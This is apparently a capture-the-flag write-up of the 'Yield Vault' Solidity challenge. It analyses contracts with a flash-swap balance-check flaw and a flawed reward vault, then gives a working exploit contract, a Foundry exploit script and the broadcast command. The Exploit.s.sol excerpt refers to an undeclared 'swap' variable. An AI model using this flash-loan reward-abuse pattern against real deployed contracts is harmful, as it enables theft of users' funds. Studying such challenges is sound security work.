# 🚩 Yield Vault – Medium

- **Category:** Blockchain
- **CTF Event:** Hacktheon Sejong CTF 2025
- **Difficulty:** Medium

---

## Given Files

- [`Deploy.s.sol`](script/Deploy.s.sol)
- [`HTOToken.sol`](src/HTOToken.sol)
- [`WETH.sol`](src/WETH.sol)
- [`VestingNFT.sol`](src/VestingNFT.sol)
- [`DepositNFT.sol`](src/DepositNFT.sol)
- [`YieldVault.sol`](src/YieldVault.sol)
- [`Swap.sol`](src/Swap.sol)

---

## Objective

### `WETH.sol`

```solidity
function flag() external returns (string memory) {
    if(this.balanceOf(msg.sender) > 100000000) {
        _burn(msg.sender, 100000000);
        return "FLAG{THIS_IS_FAKE_FLAG}";
    }
    return "";
}
```

The main goal is to get more than 100000000 WETH token as required in the `flag()` function in the `WETH` contract.

---

## Code Analysis

### `HTOToken.sol`

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import { ERC20 } from "../lib/openzeppelin-contracts/contracts/token/ERC20/ERC20.sol";
import { Ownable } from "../lib/openzeppelin-contracts/contracts/access/Ownable.sol";

contract HTOToken is ERC20, Ownable {
    constructor() ERC20("HTO Token", "HTO") Ownable(msg.sender) {
    }

    function mint(address sender, uint256 amount) external onlyOwner {
        _mint(sender, amount);
    }
}
```

It implements an ERC20 token called `HTO` token with minting functionality restricted to the contract owner. The owner can mint any amount of tokens to any address.

---

### `WETH.sol`

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import { ERC20 } from "../lib/openzeppelin-contracts/contracts/token/ERC20/ERC20.sol";
import { Ownable } from "../lib/openzeppelin-contracts/contracts/access/Ownable.sol";

contract WETH is ERC20, Ownable {
    constructor() ERC20("Wrapping ETH", "WETH") Ownable(msg.sender) {
    }

    function mint(address sender, uint256 amount) external onlyOwner {
        _mint(sender, amount);
    }

    function flag() external returns (string memory) {
        if(this.balanceOf(msg.sender) > 100000000) {
            _burn(msg.sender, 100000000);
            return "FLAG{THIS_IS_FAKE_FLAG}";
        }
        return "";
    }
}
```

Implements an ERC20 token called `WETH` with owner-only minting. It also includes a `flag()` function that checks if the caller has more than 100,000,000 WETH, burns that amount, and returns a flag string. From here, we can know that the flag is actually being stored on-chain, which is a vulnerability as on-chain contract that being compiled as bytecodes can be publicly accessible by just using cast code and reverse it to get the flag.

---

### `DepositNFT.sol`

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import { ERC721 } from "../lib/openzeppelin-contracts/contracts/token/ERC721/ERC721.sol";
import { Ownable } from "../lib/openzeppelin-contracts/contracts/access/Ownable.sol";

contract DepositNFT is ERC721, Ownable {
    constructor() ERC721("Deposit NFT", "DNFT") Ownable(msg.sender) {
    }

    function mint(address sender, uint256 amount) external onlyOwner {
        _safeMint(sender, amount);
    }
}
```

Implements an ERC721 NFT called `Deposit NFT`. The contract owner can mint NFTs to any address.

---

### `VestingNFT.sol`

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import { ERC721 } from "../lib/openzeppelin-contracts/contracts/token/ERC721/ERC721.sol";
import { Ownable } from "../lib/openzeppelin-contracts/contracts/access/Ownable.sol";

contract VestingNFT is ERC721, Ownable {
    constructor() ERC721("Vesting NFT", "VNFT") Ownable(msg.sender) {
    }

    function mint(address sender, uint256 amount) external onlyOwner {
        _safeMint(sender, amount);
    }
}
```

Implements an ERC721 NFT called `Vesting NFT`. The contract owner can mint NFTs to any address.

---

### `YieldVault.sol`

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import { WETH } from "./WETH.sol";
import { HTOToken } from "./HTOToken.sol";
import { DepositNFT } from "./DepositNFT.sol";
import { VestingNFT } from "./VestingNFT.sol";
import { ReentrancyGuard } from "../lib/openzeppelin-contracts/contracts/utils/ReentrancyGuard.sol";

contract YieldVault is ReentrancyGuard {
  struct Deposit {
    bool alive;
    uint256 depositAmount;
    uint64 endTimestamp;
  }
  Deposit[] internal deposits;

  struct Vesting {
    uint256 depositId;
    uint64 lastRewardedTimestamp;
  }
  Vesting[] internal vestings;

  WETH public wETH;
  HTOToken public htoToken;
  DepositNFT public depositNft;
  VestingNFT public vestingNft;

  constructor(address _wETH, address _htoToken, address _depositNft, address _vestingNft) {
    wETH = WETH(_wETH);
    htoToken = HTOToken(_htoToken);
    depositNft = DepositNFT(_depositNft);
    vestingNft = VestingNFT(_vestingNft);
  }

  function deposit(uint256 _depositAmount) external nonReentrant {
    wETH.transferFrom(msg.sender, address(this), _depositAmount);

    deposits.push(
      Deposit({
        alive: true,
        depositAmount: _depositAmount,
        endTimestamp: uint64(block.timestamp) + 1666551940
      })
    );
    uint256 _depositId = deposits.length - 1;
    depositNft.mint(msg.sender, _depositId);

    vestings.push(
      Vesting({
        depositId: _depositId,
        lastRewardedTimestamp: 0
      })
    );
    uint256 _vestingId = vestings.length - 1;
    vestingNft.mint(msg.sender, _vestingId);
  }

  function vesting(uint256 _vestingId) external nonReentrant {
    require(vestingNft.ownerOf(_vestingId) == msg.sender);
    require(_vestingId < vestings.length);

    Vesting memory _vesting = vestings[_vestingId];
    Deposit memory _deposit = deposits[_vesting.depositId];
    require(_deposit.alive);

    uint256 _reward = (_deposit.depositAmount * (uint64(block.timestamp) - _vesting.lastRewardedTimestamp)) / 1000;
    htoToken.transfer(msg.sender, _reward);
    _deposit.endTimestamp = uint64(block.timestamp) + 1666551940;
    _vesting.lastRewardedTimestamp = uint64(block.timestamp);
  }

  function withdraw(uint256 _depositId, bool force) external nonReentrant {
    require(depositNft.ownerOf(_depositId) == msg.sender);

    Deposit memory _deposit = deposits[_depositId];
    require(_deposit.alive);

    uint256 reward = _deposit.depositAmount;

    if (!force) { // Put false to take htoToken
      uint64 currentTimestamp = uint64(block.timestamp);
      require(currentTimestamp > _deposit.endTimestamp);
      htoToken.transfer(msg.sender, reward);
    }

    wETH.transfer(msg.sender, reward);
    _deposit.alive = false;
  }
}
```

A vault contract that allows users to deposit `WETH`, receive `DNFT` and `VNFT` NFTs in `deposit()`, and earn HTO token as rewards in `vesting()`. Users can vest to claim rewards and withdraw their deposit (`WETH` tokens) in `withdraw()`.

---

### `Swap.sol`

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import { IERC20 } from "../lib/openzeppelin-contracts/contracts/token/ERC20/IERC20.sol";
import { ReentrancyGuard } from "../lib/openzeppelin-contracts/contracts/utils/ReentrancyGuard.sol";

import { WETH } from "./WETH.sol";
import { HTOToken } from "./HTOToken.sol";

interface IUniswapV2Callee {
  function uniswapV2Call(address sender, uint amount0Out, uint amount1Out, bytes calldata data) external;
}

contract Swap is ReentrancyGuard {
  WETH public wETH; 
  HTOToken public htoToken;

  constructor(address _wETH, address _htoToken) {
    wETH = WETH(_wETH);
    htoToken = HTOToken(_htoToken);
  }

  function _getExchange(uint amount0Out, uint amount1Out) public returns (uint) {
    return amount0Out != 0 ? amount0Out * 2 : amount1Out / 2; 
  }

  function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external nonReentrant {
    address _from;
    address _to;
    uint _amount;

    if (amount0Out != 0) {
      _from = address(wETH);
      _to = address(htoToken);
      _amount = amount0Out;
    } else {
      _to = address(wETH);
      _from = address(htoToken);
      _amount = amount1Out;
    }

    if (data.length == 0) {
      IERC20(_to).transfer(to, _getExchange(amount0Out, amount1Out));
      IERC20(_from).transferFrom(to, address(this), _amount);
    } else {
      uint balanceBefore = IERC20(_from).balanceOf(address(this));

      IERC20(_from).transfer(to, _amount);
  
      IUniswapV2Callee(to).uniswapV2Call(to, amount0Out, amount1Out, data);

      uint balanceAfter = IERC20(_from).balanceOf(address(this));

      require(balanceAfter >= balanceBefore);
    }
  }
}
```

This contract allows exchanging between WETH and HTO tokens. It supports both direct swaps and flash swaps (with callback), enabling advanced interactions such as borrowing tokens for a single transaction. However, since that it only check `balanceAfter` greater or equal to `balanceBefore`, it cause a vulnerability for user to conduct malicious activity including utlizing the borrowed tokens in its own protocol and get free awards such as earning `HTO` tokens in the `vesting()` from `YieldVaults` contract. Furthermore, since in the `swap()` in this contract allows users to swap `HTO` to `WETH`, the users can earn free `WETH`, which is very terrible.

---

### `Deploy.s.sol`

```solidity
function run() public {
    vm.startBroadcast();
    WETH wETH = new WETH();
    console.log("wETH deployed at:", address(wETH));
        
    HTOToken htoToken = new HTOToken();
    console.log("HTOToken deployed at:", address(htoToken));

        
    DepositNFT depositNFT = new DepositNFT();
    console.log("DepositNFT deployed at:", address(depositNFT));

        
    VestingNFT vestingNFT = new VestingNFT();
    console.log("VestingNFT deployed at:", address(vestingNFT));
        
    YieldVault yieldVault = new YieldVault(
        address(wETH),
        address(htoToken),
        address(depositNFT),
        address(vestingNFT)
    );
    console.log("YieldVault deployed at:", address(yieldVault));

    wETH.mint(address(yieldVault), 255); 
    htoToken.mint(address(yieldVault), 340282366920938463463374607431768211455); 

    depositNFT.transferOwnership(address(yieldVault));
    vestingNFT.transferOwnership(address(yieldVault));

    Swap swap = new Swap(address(wETH), address(htoToken));
    console.log("Swap deployed at:", address(swap));

    wETH.mint(address(swap), 4294967295); 
    htoToken.mint(address(swap), 18446744073709551615); 

    vm.stopBroadcast();
}
```

A deployment script that deploys all contracts, mints initial token supplies to the vault and swap contracts, and sets up ownership and permissions for the NFTs. It prepares the environment for the challenge.

---

## Exploitation

`MaliciousCallee.sol`:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import { Swap } from "../src/Swap.sol";
import { WETH } from "../src/WETH.sol";
import { HTOToken } from "../src/HTOToken.sol";
import { YieldVault } from "../src/YieldVault.sol";
import { console } from "../lib/forge-std/src/console.sol";
import { IERC721Receiver } from "../lib/openzeppelin-contracts/contracts/token/ERC721/IERC721Receiver.sol";

interface IUniswapV2Callee {
  function uniswapV2Call(address sender, uint amount0Out, uint amount1Out, bytes calldata data) external;
}

contract MaliciousCallee is IUniswapV2Callee, IERC721Receiver {
    Swap public swapContract;
    WETH public wETH;
    HTOToken public htoToken;
    YieldVault public yieldVault;
    string public flag;
    address public player;

    constructor(address _swapContract, address _player, address _wETH, address _htoToken, address _yieldVault) {
        swapContract = Swap(_swapContract);
        player = _player;
        wETH = WETH(_wETH);
        htoToken = HTOToken(_htoToken);
        yieldVault = YieldVault(_yieldVault);
    }

    function uniswapV2Call(address maliciousCallee, uint amount0Out, uint amount1Out, bytes calldata data) external override {
        console.log("balance of wETH after borrowing (calling swap()): ", wETH.balanceOf(address(this)));
        console.log("Let's use the borrowed wETH to get HTOToken before returning it back");
        console.log("We can call deposit() to get qualified first and call vesting() to get HTOToken and then withdraw() to get wETH back");
        wETH.approve(address(yieldVault), 200000002);
        yieldVault.deposit(200000002);
        yieldVault.vesting(0);
        console.log("balance of HTOToken after calling vesting() : ", htoToken.balanceOf(address(this)));
        yieldVault.withdraw(0, true);
        console.log("balance of HTOToken after calling withdraw() : ", htoToken.balanceOf(address(this)));
        console.log("Nice we have enough HTOToken dy, let's return the wETH back");
        wETH.transfer(address(swapContract),200000002);
    }

    function swap() public {
        htoToken.approve(address(swapContract), 200000002);
        swapContract.swap(0, 200000002, address(this), "");
        console.log("balance of HTOToken after calling swap() : ", htoToken.balanceOf(address(this)));
        console.log("balance of wETH after calling swap() : ", wETH.balanceOf(address(this)));
        console.log("Since we have more than 100000000 wETH after swapping it by using HTOToken, we can call flag() to get the flag");
        string memory flag = wETH.flag();
        console.log("Flag:", flag);
        console.log("balance of wETH after calling flag() : ", wETH.balanceOf(address(this)));
        console.log("You can see the wETH get burned after calling flag()");
    }

    function getFlag() external view returns (string memory) {
        return flag;
    }

    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external override returns (bytes4) {
        // Log the receipt of the ERC721 token (optional)
        console.log("Token Id of ERC721 token received:", tokenId);

        // Return the selector to confirm the token transfer
        return this.onERC721Received.selector;
    }
}
```

This contract is designed to exploit the Yield Vault system. It implements the UniswapV2 callback interface to perform a flash swap, borrowing `WETH` from the `Swap` contract. It then deposits the borrowed `WETH` into the `YieldVault`, claims `HTO` tokens rewards via `vesting()`, and withdraws the `WETH` in return it back to `YieldVault` to fulfill the require statement, `require(balanceAfter >= balanceBefore)`. Finally, in the `swap()`, it swaps the `HTO` tokens back for WETH to exceed the threshold required to call the `flag()` function in the `WETH` contract and obtain the flag.

`Exploit.s.sol`:

```solidity
function run() public {
    vm.startBroadcast();
    MaliciousCallee callee = new MaliciousCallee(vm.envAddress("Swap"), vm.envAddress("WALLET"), vm.envAddress("WETH"), vm.envAddress("HTOToken"), vm.envAddress("YieldVault"));
    vm.warp(1000);
    swap.swap(200000002, 100000001, address(callee), "d");
    callee.swap();
    vm.stopBroadcast();
}
```
This script automates the exploitation process. It deploys the `MaliciousCallee` contract, manipulates the blockchain timestamp by using `vm.warp()`, and triggers the exploit by calling the `swap()` function with crafted parameters. The script orchestrates the attack flow, ultimately retrieving the flag from the `WETH` contract.

See the full exploitation script [here](script/Exploit.s.sol).

### Command to Deploy the Script

The command to deploy the exploit contract:

```bash
forge script script/Exploit.s.sol --broadcast --rpc-url $RPC_URL --private-key $PK
```

Please kindly save the variables in the `.env` file. However, and please don't save your private key in plaint text in production!

---